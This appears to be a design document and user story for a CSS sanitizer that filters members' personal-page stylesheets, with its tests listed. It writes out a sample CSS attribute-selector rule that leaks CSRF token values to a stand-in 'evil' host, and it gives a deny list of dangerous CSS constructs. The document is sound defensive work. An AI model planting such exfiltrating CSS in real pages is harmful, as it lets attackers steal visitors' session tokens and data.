<!--
Copyright (c) Bruce Perens K6BP.
SPDX-License-Identifier: AGPL-3.0-or-later
-->

# Story: A Member Can Style Their Page, Not Read the Viewer's Page Through It

As a **Member** with a personal page, I want to write a `<style>` block, so that my page looks the
way I want. As a **Visitor**, I want that style to be unable to send anything about my session to
another site, and unable to cover the site's own navigation with a forged form. As a **Security
Reviewer**, I want that to hold by construction (the stylesheet filter below).

## The Problem

A member `<style>` runs no script, but `input[value^="a"] { background: url(https://evil/a) }` makes
the visitor's browser request a different URL for each guess at any value on the page, the CSRF (cross-site request forgery)
token field and the visitor's own name included, and `position: fixed` covers the site's header.
`<link rel="stylesheet" href="https://...">` makes every visitor fetch from a host the member chose.

## The Stylesheet Filter

### `sanitize_stylesheet(text)` `[@ANCHOR: zero_sudo:css_stylesheet_filter]`

Module `zero_sudo/css_sanitizer.py`, plain Python with no `odoo` import. It reads a stylesheet as rules and writes it again from
the parts it accepts, so the result is built, not scrubbed.

| Argument | Type | Meaning |
|---|---|---|
| `text` | `str` | the text of one member `<style>` element |

Returns `(css, dropped)`: `css` is the rebuilt sheet (rules joined by newlines) and `dropped` is `True` when anything the author
wrote was removed other than a comment, so the caller can log it. A blank sheet gives `("", False)`. A sheet over 64 KiB, or
holding a control character or a non-character code point, gives `("", True)`; an unterminated comment is deleted and counts as
dropped. Comments are deleted, not replaced by a space, so `ur/**/l(` reads as `url(` and is refused. Accepted: style rules,
`@media` with a plain condition (two levels deep at most) and `@keyframes`; every other at-rule is dropped with its block.
Selectors use a plain character set (no escapes, braces, `@` or `<`). Declarations need a lower-case property name and a value
without `url()` (except `url(#fragment)`), `image-set()`, `image()`, `src()`, `element()`, `cross-fade()`, `paint()`, `attr()`,
`expression`, `behavior`, `binding`, `javascript:`, `data:`, backslash, `@`, `<`, `&` or braces, and `position` only `static`,
`relative` or `absolute`. Caps: 2000 rules, 200 declarations per rule, 500 characters per value; the excess is dropped.
A bad declaration costs only itself, a bad rule only itself. The output is stable: filtering it again changes nothing. Pure, no
I/O, no exception for hostile input. Tests: `zero_sudo/tests/test_css_sanitizer.py`.

## Design

`website.page._sanitize_user_arch` `[@ANCHOR: user_websites:page_arch_style_link_filter]` removes
every `<link>` element and rebuilds each `<style>` from `zero_sudo.css_sanitizer.sanitize_stylesheet`:
style rules, `@media` and `@keyframes` only; selectors from a plain character set; declarations with
no `url()` except `url(#fragment)`, no `image-set()`/`image()`/`src()`/`element()`/`attr()`, no
`expression`/`behavior`/`javascript:`/`data:`, no escapes, and `position` only `static`, `relative`
or `absolute`. Anything else is dropped rule by rule, so one bad declaration does not cost the
member the rest of the sheet. The output is stable: filtering it again changes nothing.

A `style="..."` attribute goes through `sanitize_style_attribute` `[@ANCHOR: zero_sudo:css_style_attribute_filter]`, which applies the same declaration rules one declaration at a time and returns `(declarations, dropped)`. An attribute cannot select other elements, but `background:url(https://other-site/x)` is still a third-party request for every visitor and `position:fixed` still covers the site's own chrome. A declaration whose value is refused is removed and the rest are kept. Malformed CSS drops the whole attribute: an unterminated comment, string or parenthesis, a brace, a control character, a declaration with no colon, a property name that is not a plain lower-case identifier, or a value over the size cap. Comments are deleted, not replaced, and running the filter on its own output changes nothing.

Neither removal counts as an injection attempt (no strike): a linked web font or a fixed header is
not an attack; the removal is logged.

## Known limit

Update: the `style=""` attribute limit described below has since been closed. The
[user_websites README](../../../user_websites/README.md) ("Member CSS") records that every `style="..."` attribute is now filtered
declaration by declaration with the same sanitizer; read the paragraph below as the original limit.

`position: absolute` is kept: it only escapes its container when no ancestor is positioned, and
members use it for ordinary layouts. A `style=""` attribute on an element is not filtered by this
(it cannot select other elements, so it cannot read the page, but it can still carry `url()` and
`position: fixed`). Whether to filter it too changes what members' existing pages look like, so it is
a question for the site owner, not decided here.

## Tests

### The stylesheet filter alone `[@ANCHOR: test_css_stylesheet_filter]`

`zero_sudo/tests/test_css_sanitizer.py` runs a corpus of hostile sheets (attribute-selector exfiltration, `position: fixed`
overlays, `@import`, `url()` to another host, escapes, comment splitting, `expression`, over-long and over-deep input) and
requires that each comes out inert and that filtering the output again changes nothing. It also checks that ordinary styling
(selectors, `@media`, `@keyframes`, `!important`) survives without being flagged as dropped, that only the bad declaration is
removed from a rule, that a hostile rule neither hides a later good one nor leaks into it, and the size and count caps.

### The member save path and the served page `[@ANCHOR: user_websites:test_user_arch_style_link_filter]`

`user_websites/tests/test_user_arch_style_link.py` saves member pages through `website.page` create and write and requires that
every `<link>` is removed whatever its `rel` or spelling (its text is kept), that hostile rules are removed from a `<style>` while
the rest stay, that a `<style>` left empty is removed, that its attributes and children cannot survive, that a second pass changes
nothing, that an ordinary member sheet survives, and that an SVG's own style still goes through the SVG allowlist. It also checks that
no strike is recorded and that the public page serves no link and no exfiltration rule.
